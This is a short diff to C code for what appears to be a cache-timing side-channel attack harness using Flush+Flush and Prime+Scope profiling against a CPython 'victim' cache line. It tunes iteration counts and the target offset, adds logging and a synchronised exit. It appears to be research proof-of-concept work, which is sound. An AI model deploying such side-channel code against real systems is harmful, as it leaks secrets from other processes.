@@ -14,14 +14,14 @@
 #include "shared_memory.h"
 
 #define CACHE_LINE_COUNT (3)
-#define PROFILE_ITERATIONS (3 << 12)
+#define PROFILE_ITERATIONS (1 << 16)
 
 #define USE_FF (0)
 #define USE_PS (1)
 
 CPYTHON_TARGET_CACHELINE(DECLARE_CACHE_LINE);
 sync_ctx_t sync_ctx;
-uint64_t victim_iteration = 64;
+uint64_t victim_iteration = 4;
 
 #if USE_FF
 static const uint64_t waiting_time = 80000;
@@ -41,6 +41,7 @@ void FF_profile_pow() {
 	create_directory("output");
 
 	for (int i = 0; i < victim_iteration; ++i) {
+		log_info("Attacker Iteration %d", i);
 		char output_file[32];
 		sprintf(output_file, "output/%d.out", i);
 		FILE *fp = fopen(output_file, "w");
@@ -133,7 +134,7 @@ void PS_profile_pow() {
 	pt_consume_zero.slot = 0;
 	pt_consume_zero.pin_cpu = -1;
 	pt_consume_zero.target =
-	    (uint8_t *)((uintptr_t)target_consume_zero + 2 * CACHE_LINE_SIZE);
+	    (uint8_t *)((uintptr_t)target_consume_zero + 3 * CACHE_LINE_SIZE);
 	pt_consume_zero.evset = prepare_evset(pt_consume_zero.target, &hctrl);
 
 	PS_thread_config_init(pt_absorb_window);
@@ -170,6 +171,9 @@ void PS_profile_pow() {
 	pthread_join(thread0, NULL);
 	pthread_join(thread1, NULL);
 	pthread_join(thread2, NULL);
+
+	sync_ctx_set_action(SYNC_CTX_EXIT);
+	pthread_barrier_wait(sync_ctx.barrier);
 }
 #endif
 
